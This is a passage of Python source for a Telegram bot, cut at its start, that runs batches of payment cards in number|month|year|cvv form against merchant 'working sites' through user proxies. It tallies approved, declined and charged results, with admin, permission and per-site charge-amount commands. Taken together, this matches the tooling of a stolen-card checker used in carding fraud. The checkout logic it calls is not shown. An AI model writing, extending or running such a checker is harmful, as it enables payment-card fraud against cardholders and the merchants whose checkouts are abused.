        "• /giveperm <user_id> <command> — Grant specific command access to a user\n\n"
        "🏷 Group Management:\n"
        "• /addgp <group_id>[, ...] — Add group chat id(s) where bot may be used\n"
        "• /showgp — Show configured allowed group ids and groups-only mode\n"
        "• /delgp <group_id>[, ...] — Remove group id(s) from allowed list\n"
        "• /onlygp — Enable groups-only mode (disable personal chats)\n"
        "• /allowall — Disable groups-only (allow personal chats)\n\n"
        "🛑 Controls:\n"
        "• /stop — Stop your own running batch(es)\n"
        "• /stopuser <user_id> — Stop specific user's running checks\n"
        "• /rmsite <site_url> — Remove site from working sites list\n"
        "• /addsite <site_url>[, ...] — Add site(s) to working sites list\n"
        "• /resetactive — Reset all active checks\n"
        "• /stopall — Stop all active checks (admin only)\n"
        "• /reboot — Reboot the bot (preserves active batches)\n\n"
        "💳 Price Management:\n"
        "• /setpr <site_url> <amount> — Set minimum charge amount for a site\n\n"
        "ℹ️ Other:\n"
        "• /admin — Show this help message"
    )
    await update.message.reply_text(help_text)

async def cmd_addgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "addgp"):
        await update.message.reply_text("Unauthorized.")
        return

    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /addgp <group_id> [<group_id> ...]\nExample: /addgp -1002798580895")
        return

    try:
        policy = await get_access_policy()
        allowed_groups = policy.get("allowed_groups") or []
        for tok in args:
            try:
                gid = int(str(tok).strip())
            except Exception:
                continue
            if gid not in allowed_groups:
                allowed_groups.append(gid)
        policy["allowed_groups"] = allowed_groups
        await set_access_policy(policy)
        await update.message.reply_text(f"Added groups: {allowed_groups}")
    except Exception as e:
        await update.message.reply_text(f"Failed to add groups: {e}")


async def cmd_showgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "showgp"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        allowed_groups = policy.get("allowed_groups") or []
        groups_only = bool(policy.get("groups_only", False))
        txt = "Allowed groups:\n"
        if not allowed_groups:
            txt += "(none)"
        else:
            for g in allowed_groups:
                txt += f"• {g}\n"
        txt += f"\nGroups-only mode: {groups_only}"
        await update.message.reply_text(txt)
    except Exception as e:
        await update.message.reply_text(f"Failed to read groups: {e}")


async def cmd_onlygp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "onlygp"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        policy["groups_only"] = True
        await set_access_policy(policy)
        await update.message.reply_text("Bot set to groups-only mode. Personal (private) chats will be denied.")
    except Exception as e:
        await update.message.reply_text(f"Failed to set groups-only: {e}")


async def cmd_allowall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "allowall"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        policy["groups_only"] = False
        await set_access_policy(policy)
        await update.message.reply_text("Bot set to allow personal chats for all users.")
    except Exception as e:
        await update.message.reply_text(f"Failed to unset groups-only: {e}")


async def cmd_delgp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "delgp"):
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /delgp <group_id> [<group_id> ...]")
        return
    try:
        policy = await get_access_policy()
        allowed_groups = set(policy.get("allowed_groups") or [])
        removed = []
        for tok in args:
            try:
                gid = int(str(tok).strip())
            except Exception:
                continue
            if gid in allowed_groups:
                allowed_groups.discard(gid)
                removed.append(gid)
        policy["allowed_groups"] = sorted(list(allowed_groups))
        await set_access_policy(policy)
        await update.message.reply_text(f"Removed groups: {removed}\nCurrent allowed groups: {policy['allowed_groups']}")
    except Exception as e:
        await update.message.reply_text(f"Failed to remove groups: {e}")


async def cmd_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "admins"):
        await update.message.reply_text("Unauthorized.")
        return
    try:
        policy = await get_access_policy()
        saved = policy.get("admin_ids") or []
        merged = set(saved) | set(int(x) for x in ADMIN_IDS if isinstance(x, int))
        lines = []
        for a in sorted(merged):
            lines.append(f"• {a}")
        txt = "Admins:\n" + ("\n".join(lines) if lines else "(none)")
        await update.message.reply_text(txt)
    except Exception as e:
        await update.message.reply_text(f"Failed to read admins: {e}")


async def cmd_rmadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "rmadmin"):
        await update.message.reply_text("Unauthorized.")
        return
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /rmadmin <user_id>")
        return
    try:
        target = int(str(args[0]).strip())
    except Exception:
        await update.message.reply_text("Invalid user id")
        return
    try:
        try:
            ADMIN_IDS.discard(target)
        except Exception:
            pass
        policy = await get_access_policy()
        saved = set(policy.get("admin_ids") or [])
        saved.discard(target)
        policy["admin_ids"] = sorted(list(saved))
        await set_access_policy(policy)
        await update.message.reply_text(f"Removed admin: {target}")
    except Exception as e:
        await update.message.reply_text(f"Failed to remove admin: {e}")


async def cmd_giveperm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "giveperm"):
        await update.message.reply_text("Unauthorized.")
        return
    full = (update.message.text or "").strip()
    args = context.args or []
    if len(args) < 2:
        await update.message.reply_text("Usage: /giveperm <user_id> <command>\nExample: /giveperm 5646492454 /addsite")
        return
    try:
        target = int(str(args[0]).strip())
    except Exception:
        await update.message.reply_text("Invalid user id")
        return
    cmd = str(args[1]).lstrip('/')
    if not cmd:
        await update.message.reply_text("Invalid command")
        return
    try:
        policy = await get_access_policy()
        perms = policy.get("perms") or {}
        key = str(int(target))
        cur = perms.get(key) or []
        if cmd.lower() not in [c.lower() for c in cur]:
            cur.append(cmd)
        perms[key] = cur
        policy["perms"] = perms
        await set_access_policy(policy)
        await update.message.reply_text(f"Granted permission '{cmd}' to user {target}")
    except Exception as e:
        await update.message.reply_text(f"Failed to grant permission: {e}")

async def stop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query
        data = (q.data or "").strip()
        if not data.startswith("STOP:"):
            await q.answer()
            return
        batch_id = data.split(":", 1)[1]
        await q.answer("Stopping...")
        rec = None
        async with ACTIVE_LOCK:
            rec = ACTIVE_BATCHES.get(batch_id)
        if rec:
            try:
                rec.get("event").set()
            except Exception:
                pass
            try:
                for t in rec.get("tasks", []):
                    if not t.done():
                        t.cancel()
            except Exception:
                pass
            try:
                await q.edit_message_reply_markup(reply_markup=None)
            except Exception:
                pass
            try:
                await remove_pending(batch_id)
            except Exception:
                pass
    except Exception:
        try:
            await update.effective_chat.send_message("Stop requested.")
        except Exception:
            pass

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    stopped = 0
    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())
    for bid, rec in items:
        try:
            if rec.get("chat_id") == chat.id and rec.get("user_id") == user.id:
                try:
                    rec.get("event").set()
                except Exception:
                    pass
                try:
                    for t in rec.get("tasks", []):
                        if not t.done():
                            t.cancel()
                except Exception:
                    pass
                stopped += 1
        except Exception:
            continue
    if stopped > 0:
        await update.message.reply_text(f"Stopping {stopped} running batch(es)...")
    else:
        await update.message.reply_text("No running batch found.")

async def cmd_stop_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("Only admins can stop other users' checks.")
        return

    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /stop <user_id>\nExample: /stop 123456789")
        return

    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
        return

    stopped = 0
    async with ACTIVE_LOCK:
        items = list(ACTIVE_BATCHES.items())
    
    for bid, rec in items:
        try:
            if rec.get("user_id") == target_id:
                try:
                    rec.get("event").set()
                except Exception:
                    pass
                try:
                    for t in rec.get("tasks", []):
                        if not t.done():
                            t.cancel()
                except Exception:
                    pass
                try:
                    chat_id, msg_id = rec.get("progress") or (None, None)
                    if chat_id and msg_id:
                        await context.bot.edit_message_reply_markup(chat_id=chat_id, message_id=msg_id, reply_markup=None)
                except Exception:
                    pass
                stopped += 1
        except Exception:
            continue

    if stopped > 0:
        await update.message.reply_text(f"Stopped {stopped} running batch(es) for user {target_id}")
    else:
        await update.message.reply_text(f"No running batches found for user {target_id}")

async def cmd_active(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not await ensure_access(update, context):
        return

    try:
        async with ACTIVE_LOCK:
            items = list(ACTIVE_BATCHES.items())
    except Exception as e:
        logger.error(f"Error accessing ACTIVE_BATCHES: {e}")
        await update.message.reply_text("Error accessing active batches data.")
        return

    if not items:
        try:
            pend = await list_pending()
        except Exception:
            pend = {}
        if not isinstance(pend, dict) or not pend:
            await update.message.reply_text("No active checks.")
            return
        lines = ["🕒 Scheduled checks (starting soon):"]
        for pbid, payload in list(pend.items())[:10]:
            try:
                title = (payload.get("title") or "Batch")
                cards = payload.get("cards") or []
                sites = payload.get("sites") or []
                lines.append(f"• {title} — Cards: {len(cards)} — Sites: {len(sites)}")
            except Exception:
                continue
        await update.message.reply_text("\n".join(lines), disable_web_page_preview=True)
        return

    lines = ["🔧 Active checks (all users):"]
    now = time.time()
    for bid, rec in items:
        counts = rec.get("counts") or {}
        total = counts.get("total", 0)
        processed = counts.get("processed", 0)
        approved = counts.get("approved", 0)
        charged = counts.get("charged", 0)
        start_ts = counts.get("start_ts", None)
        title = counts.get("title") or "Batch"

        uid = rec.get("user_id")
        who = ""
        try:
            who = (rec.get("user_name") or "").strip()
        except Exception:
            who = ""
        try:
            username = (rec.get("user_username") or "").strip() if isinstance(rec.get("user_username"), str) else ""
        except Exception:
            username = ""
        if (not who) or who.isdigit() or (not username):
            try:
                s = await get_user_stats(int(uid))
                n = (s.get("name") or "").strip()
                u = (s.get("username") or "").strip()
                if (not who) or who.isdigit():
                    if n:
                        who = n
                if (not username) and u:
                    username = u
            except Exception:
                pass
        if (not who) or who.isdigit() or (not username):
            try:
                chat_obj = await context.bot.get_chat(int(uid))
                try:
                    full = getattr(chat_obj, "full_name", None)
                except Exception:
                    full = None
                if not full:
                    try:
                        first = getattr(chat_obj, "first_name", "") or ""
                        last = getattr(chat_obj, "last_name", "") or ""
                        full = f"{first} {last}".strip()
                    except Exception:
                        full = None
                if (not who) or who.isdigit():
                    if isinstance(full, str) and full.strip():
                        who = full.strip()
                un = None
                try:
                    un = getattr(chat_obj, "username", None)
                except Exception:
                    un = None
                if (not username) and isinstance(un, str) and un.strip():
                    username = un.strip()
                try:
                    async with ACTIVE_LOCK:
                        cur = ACTIVE_BATCHES.get(bid)
                        if cur is not None:
                            if who:
                                cur["user_name"] = who
                            if username:
                                cur["user_username"] = username
                            ACTIVE_BATCHES[bid] = cur
                except Exception:
                    pass
                try:
                    async with STATS_LOCK:
                        s2 = _load_stats()
                        key = str(uid)
                        cur_stat = s2.get(key, {})
                        if isinstance(who, str) and who.strip():
                            cur_stat["name"] = who.strip()
                        if isinstance(username, str) and username.strip():
                            cur_stat["username"] = username.strip()
                        s2[key] = cur_stat
                        _save_stats(s2)
                except Exception:
                    pass
            except Exception:
                pass
        if not who:
            who = str(uid)

        try:
            elapsed = (now - float(start_ts)) if isinstance(start_ts, (int, float)) else 0.0
        except Exception:
            elapsed = 0.0

        try:
            derived_declined = max(0, int(processed or 0) - int(approved or 0) - int(charged or 0))
        except Exception:
            derived_declined = 0

        progress_str = f"{processed}/{total}" if isinstance(total, int) and isinstance(processed, int) else "N/A"
        
        if isinstance(username, str) and username.strip():
            uname_fmt = username.strip()
            if not uname_fmt.startswith("@"): 
                uname_fmt = f"@{uname_fmt}"
            user_display = f"{who} ({uname_fmt})"
        else:
            user_display = who
        
        lines.append(
            f"• {title} — User: {user_display} — UID: {uid} — Progress: {progress_str} — "
            f"Approved: {approved}, Declined: {derived_declined}, Charged: {charged} — "
            f"Elapsed: {elapsed:.1f}s"
        )

    await update.message.reply_text("\n".join(lines), disable_web_page_preview=True)

async def pref_approved_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query
        data = (q.data or "").strip()
        send_approved = data.upper().endswith("YES")
        await q.answer()
    except Exception:
        send_approved = True

    try:
        if not await ensure_access(update, context):
            return
    except Exception:
        pass

    cards = context.chat_data.get("pending_cards") or []
    sites = context.chat_data.get("pending_sites") or []
    title = context.chat_data.get("pending_title") or "File Batch"

    if not cards:
        txt_path = context.chat_data.get("last_txt_path")
        if not (txt_path and os.path.exists(txt_path)):
            await update.effective_chat.send_message("No pending file. Please send a .txt and use /txt again.")
            return
        cards = parse_cards_from_file(txt_path)

    if not sites:
        sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.effective_chat.send_message("No sites found in working_sites.txt.")
        return

    batch_id = f"{update.effective_chat.id}:{int(time.time())}"
    cancel_event = asyncio.Event()
    proxy_mapping = None
    try:
        saved_list = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_list, list) and len(saved_list) > 0:
            proxy_mapping = list(saved_list)
            try:
                if len(saved_list) == 1:
                    await update.effective_chat.send_message(f"Using your saved proxy: {_mask_proxy_display(saved_list[0])}")
                else:
                    first = _mask_proxy_display(saved_list[0])
                    await update.effective_chat.send_message(f"Using your saved proxies ({len(saved_list)}): {first} (+{len(saved_list)-1} more)")
            except Exception:
                pass
    except Exception:
        proxy_mapping = None
    try:
        chosen_executor = GLOBAL_EXECUTOR if (isinstance(cards, list) and len(cards) > SMALL_BATCH_THRESHOLD) else SMALL_TASK_EXECUTOR
    except Exception:
        chosen_executor = GLOBAL_EXECUTOR
    runner = BatchRunner(cards, sites, chosen_executor, batch_id, update.effective_chat.id, update.effective_user.id, cancel_event, send_approved_notifications=send_approved, proxies_override=proxy_mapping)
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "progress": (None, None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": runner.start_ts,
                    "title": title,
                },
            }
    except Exception:
        pass
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": title,
            "cards": cards,
            "sites": sites,
            "send_approved_notifications": bool(send_approved),
        })
    except Exception:
        pass
    context.application.create_task(runner.run_with_notifications(update, context, title=title))

    try:
        context.chat_data.pop("pending_cards", None)
        context.chat_data.pop("pending_sites", None)
        context.chat_data.pop("pending_title", None)
    except Exception:
        pass
    try:
        await q.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass

def _mask_proxy_display(url: str) -> str:
    try:
        from urllib.parse import urlparse
        uu = urlparse(url)
        nl = uu.netloc
        if "@" in nl:
            creds, host = nl.split("@", 1)
            if ":" in creds:
                usr = creds.split(":", 1)[0]
                return f"{uu.scheme}://{usr}:****@{host}"
            return f"{uu.scheme}://****@{host}"
        return f"{uu.scheme}://{nl}"
    except Exception:
        return url


async def cmd_st_cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    
    full_text = (update.message.text or "").strip()
    cards_text = ""
    
    try:
        if full_text.lower().startswith("/st"):
            cards_text = full_text.split(" ", 1)[1] if len(full_text.split(" ", 1)) > 1 else ""
    except Exception:
        cards_text = ""
    
    if not cards_text:
        replied = update.message.reply_to_message
        if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
            cards_text = replied.text.strip()
    
    if not cards_text:
        await update.message.reply_text(
            "Usage:\n"
            "/st <card> - Check a single card\n"
            "/st <card1>\n<card2>\n... - Check multiple cards (max 25)\n"
            "Example: /st 4242424242424242|12|25|123"
        )
        return
    
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
    
    if len(card_lines) > 25:
        await update.message.reply_text(f"Too many cards. Maximum allowed is 25. Processing first 25.")
        card_lines = card_lines[:25]
    
    user_proxies = None
    try:
        saved_proxies = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_proxies, list) and len(saved_proxies) > 0:
            user_proxies = list(saved_proxies)
            try:
                if len(saved_proxies) == 1:
                    await update.message.reply_text(f"Using your saved proxy: {_mask_proxy_display(saved_proxies[0])}")
                else:
                    first = _mask_proxy_display(saved_proxies[0])
                    await update.message.reply_text(f"Using your saved proxies ({len(saved_proxies)}): {first} (+{len(saved_proxies)-1} more)")
            except Exception:
                pass
    except Exception:
        user_proxies = None
    
    cards = []
    for i, card_line in enumerate(card_lines):
        try:
            number, month, year, cvc = card_line.split('|')
            if not all([number, month, year, cvc]):
                await update.message.reply_text(f"Invalid card format at line {i+1}: {card_line}\nUse: number|month|year|cvv")
                continue
            cards.append({
                "number": number.strip(),
                "month": month.strip(),
                "year": year.strip(),
                "verification_value": cvc.strip()
            })
        except Exception:
            await update.message.reply_text(f"Error parsing card at line {i+1}: {card_line}\nUse format: number|month|year|cvv")
            continue
    
    if not cards:
        await update.message.reply_text("No valid cards found to process.")
        return
        
    batch_id = f"{update.effective_chat.id}:{int(time.time())}"
    cancel_event = asyncio.Event()
    runner = BatchRunner(
        cards=cards,
        sites=[],
        executor=GLOBAL_EXECUTOR,
        batch_id=batch_id,
        chat_id=update.effective_chat.id,
        user_id=update.effective_user.id,
        cancel_event=cancel_event,
        send_approved_notifications=True,
        proxies_override=user_proxies
    )
    
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": time.time(),
                    "title": "ST Check"
                }
            }
    except Exception:
        pass

    context.application.create_task(runner.run_with_notifications(update, context, title="ST Check"))


async def cmd_allowuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "allowuser"):
        await update.message.reply_text("Unauthorized.")
        return
        
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /allowuser <user_id>")
        return
        
    try:
        target_id = int(args[0])
        policy = await get_access_policy()
        bypass_users = policy.get("bypass_groups_only", []) or []
        
        if target_id in bypass_users:
            await update.message.reply_text(f"User {target_id} is already allowed to bypass groups-only mode.")
            return
            
        bypass_users.append(target_id)
        policy["bypass_groups_only"] = bypass_users
        await set_access_policy(policy)
        
        await update.message.reply_text(f"User {target_id} can now use the bot in private chat even when groups-only mode is active.")
        
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
    except Exception as e:
        await update.message.reply_text(f"Failed to update policy: {e}")


async def cmd_rmuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not await has_permission(user.id, "rmuser"):
        await update.message.reply_text("Unauthorized.")
        return
        
    args = context.args or []
    if not args:
        await update.message.reply_text("Usage: /rmuser <user_id>")
        return
        
    try:
        target_id = int(args[0])
        policy = await get_access_policy()
        bypass_users = policy.get("bypass_groups_only", []) or []
        
        if target_id not in bypass_users:
            await update.message.reply_text(f"User {target_id} is not in the bypass list.")
            return
            
        bypass_users.remove(target_id)
        policy["bypass_groups_only"] = bypass_users
        await set_access_policy(policy)
        
        await update.message.reply_text(f"User {target_id} removed from groups-only bypass list.")
    except ValueError:
        await update.message.reply_text("Invalid user ID. Must be a number.")
    except Exception as e:
        await update.message.reply_text(f"Failed to update policy: {e}")


def main():
    ensure_uploads_dir()

    try:
        checkout.SUMMARY_ONLY = True
    except Exception:
        pass

    app = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).post_init(_post_init).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CommandHandler("txt", cmd_txt))
    app.add_handler(CommandHandler("setpr", cmd_setpr))
    app.add_handler(CommandHandler("allowuser", cmd_allowuser))
    app.add_handler(CommandHandler("rmuser", cmd_rmuser))
    app.add_handler(CommandHandler("st", cmd_st_cc))
    app.add_handler(CommandHandler("sh", cmd_sh))
    
    app.add_handler(CommandHandler("me", cmd_me))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("resetstats", cmd_resetstats))
    app.add_handler(CommandHandler("show", cmd_show))
    
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("broadcastuser", cmd_broadcastuser))
    app.add_handler(CommandHandler("broadcastactive", cmd_broadcastactive))
    
    app.add_handler(CommandHandler("restrict", cmd_restrict))
    app.add_handler(CommandHandler("allowonly", cmd_allowonly))
    app.add_handler(CommandHandler("unrestrict", cmd_unrestrict))
    
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("admins", cmd_admins))
    app.add_handler(CommandHandler("rmadmin", cmd_rmadmin))
    app.add_handler(CommandHandler("giveperm", cmd_giveperm))
    
    app.add_handler(CommandHandler("addgp", cmd_addgp))
    app.add_handler(CommandHandler("showgp", cmd_showgp))
    app.add_handler(CommandHandler("onlygp", cmd_onlygp))
    app.add_handler(CommandHandler("allowall", cmd_allowall))
    app.add_handler(CommandHandler("delgp", cmd_delgp))
    app.add_handler(CommandHandler("allowuser", cmd_allowuser))
    app.add_handler(CommandHandler("rmuser", cmd_rmuser))
    
    app.add_handler(CommandHandler("addsite", cmd_addsite))
    app.add_handler(CommandHandler("rmsite", cmd_rmsite))
    app.add_handler(CommandHandler("site", cmd_site))
    
    app.add_handler(CommandHandler("reboot", cmd_reboot))
    app.add_handler(CommandHandler("resetactive", cmd_resetactive))
    app.add_handler(CommandHandler("stopall", cmd_stopall))
    
    app.add_handler(CallbackQueryHandler(stop_cb, pattern="^STOP:"))
    app.add_handler(CallbackQueryHandler(pref_approved_cb, pattern="^PREF_APPROVED:"))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("stopuser", cmd_stop_user))
    app.add_handler(CommandHandler("active", cmd_active))


    app.run_polling()


if __name__ == "__main__":
    main()